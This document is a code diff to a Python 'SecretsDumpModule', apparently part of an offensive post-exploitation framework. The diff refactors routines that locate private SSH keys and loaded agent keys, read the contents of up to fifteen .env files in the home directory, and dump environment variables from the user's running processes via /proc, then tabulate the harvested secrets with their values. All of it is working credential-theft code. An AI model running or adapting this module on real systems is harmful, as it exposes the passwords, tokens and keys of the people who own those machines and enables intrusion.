@@ -157,7 +157,9 @@ class SecretsDumpModule(KoiModule):
         for label, hunt in hunts:
             self.status(f"Hunting {label.lower()}...")
             result = hunt()
-            if result:
+            if isinstance(result, int):
+                total_found += result
+            elif result:
                 self._display_results(label, result)
                 total_found += _count_findings(result)
 
@@ -188,35 +190,45 @@ class SecretsDumpModule(KoiModule):
         else:
             self.box(f"[{category}]", {"data": str(entries)})
 
-    def _hunt_ssh_keys(self) -> dict:
-        """Extract SSH keys and config from ~/.ssh/"""
-        result = {}
+    def _hunt_ssh_keys(self) -> int:
+        count = 0
+        key_re = re.compile(r'(id_.*|key_.*|.*_rsa|.*_ed25519)')
 
-        # List private keys found
-        keys_list = self._try_exec("ls ~/.ssh/ 2>/dev/null")
-        if keys_list:
-            key_patterns = re.compile(r'(id_.*|key_.*|.*_rsa|.*_ed25519)')
-            keys = [k.strip() for k in keys_list.split('\n')
-                   if k.strip() and key_patterns.match(k.strip())]
-            if keys:
-                result["Private Keys Found"] = ", ".join(keys[:15])
+        keys_output = self._try_exec(
+            "find ~/.ssh/ -maxdepth 1 -type f 2>/dev/null"
+        )
+        if keys_output:
+            rows = []
+            for path in keys_output.split('\n'):
+                path = path.strip()
+                if not path:
+                    continue
+                name = path.rsplit('/', 1)[-1]
+                if key_re.match(name):
+                    rows.append([name, path])
+            if rows:
+                self.table("SSH Keys", ["key", "path"], rows[:15])
+                count += len(rows[:15])
 
-        # SSH config - parse for interesting hosts
+        extras = {}
         ssh_config = self._try_exec("cat ~/.ssh/config 2>/dev/null")
         if ssh_config:
             parsed = parse_ssh_config(ssh_config)
             if parsed:
-                result["SSH Hosts Configured"] = str(len(parsed))
+                extras["SSH Hosts Configured"] = str(len(parsed))
 
-        # SSH agent keys
         agent_keys = self._try_exec("ssh-add -l 2>/dev/null")
         if agent_keys:
             key_count = len([l for l in agent_keys.split('\n')
                            if l.strip() and any(k in l for k in ['RSA', 'ED25519', 'ECDSA'])])
             if key_count > 0:
-                result["SSH Agent Keys Loaded"] = f"{key_count} keys"
+                extras["SSH Agent Keys Loaded"] = f"{key_count} keys"
 
-        return result
+        if extras:
+            self.box("[SSH Keys]", extras)
+            count += _count_findings(extras)
+
+        return count
 
     def _hunt_git_creds(self) -> dict:
         """Extract git credentials."""
@@ -336,38 +348,78 @@ class SecretsDumpModule(KoiModule):
 
         return result
 
-    def _hunt_env_files(self) -> dict:
-        """Hunt .env files which often contain credentials."""
-        result = {}
-
-        content = self._try_exec(
-            "find ~ -maxdepth 5 -type f -name '.env*' 2>/dev/null | head -15 | xargs -r cat 2>/dev/null"
+    def _hunt_env_files(self) -> int:
+        output = self._try_exec(
+            "find ~ -maxdepth 5 -type f -name '.env*' 2>/dev/null | head -15 | "
+            "while IFS= read -r f; do echo \"===FILE:$f===\"; cat \"$f\" 2>/dev/null; done"
         )
+        if not output:
+            return 0
 
-        if content:
-            parsed = parse_env_file(content)
-            if parsed:
-                result[".env Files"] = parsed
+        rows = []
+        current_file = None
+        current_lines: list[str] = []
 
-        return result
+        for line in output.split('\n'):
+            if line.startswith('===FILE:') and line.endswith('==='):
+                if current_file and current_lines:
+                    for key, val in parse_env_file('\n'.join(current_lines)).items():
+                        rows.append([current_file, key, val])
+                current_file = line[8:-3]
+                current_lines = []
+            else:
+                current_lines.append(line)
 
-    def _hunt_process_env(self) -> dict:
-        """Extract environment variables from running processes."""
-        result = {}
+        if current_file and current_lines:
+            for key, val in parse_env_file('\n'.join(current_lines)).items():
+                rows.append([current_file, key, val])
 
-        proc_env = self._try_exec(
+        if rows:
+            self.table(".env Files", ["file", "variable", "value"], rows[:30])
+            return len(rows[:30])
+        return 0
+
+    def _hunt_process_env(self) -> int:
+        output = self._try_exec(
             "for pid in $(pgrep -u $USER 2>/dev/null | head -10); do "
+            "comm=$(cat /proc/$pid/comm 2>/dev/null); "
+            "echo \"===PROC:$pid:$comm===\"; "
             "tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null; "
             "done"
         )
+        if not output:
+            return 0
 
-        if proc_env:
-            filtered = filter_env_vars(proc_env)
-            if filtered:
-                env_dict = {k: v for k, v in sorted(filtered.items())[:20]}
-                result["Process Environment Vars"] = env_dict
+        rows = []
+        seen: set[tuple[str, str]] = set()
+        current_proc = None
+        current_lines: list[str] = []
 
-        return result
+        def _flush():
+            if not current_proc or not current_lines:
+                return
+            for key, val in filter_env_vars('\n'.join(current_lines)).items():
+                if (key, val) not in seen:
+                    seen.add((key, val))
+                    rows.append([current_proc, key, val])
+
+        for line in output.split('\n'):
+            if line.startswith('===PROC:') and line.endswith('==='):
+                _flush()
+                parts = line[8:-3].split(':', 1)
+                pid, comm = parts[0], parts[1] if len(parts) > 1 else '?'
+                current_proc = f"{comm} ({pid})"
+                current_lines = []
+            else:
+                current_lines.append(line)
+
+        _flush()
+
+        if rows:
+            rows.sort(key=lambda r: r[1])
+            self.table("Process Environment", ["process", "variable", "value"], rows[:20])
+            return len(rows[:20])
+        return 0
 
     def _hunt_git_diffs(self) -> dict:
         """Hunt for recent git changes that might contain secrets."""
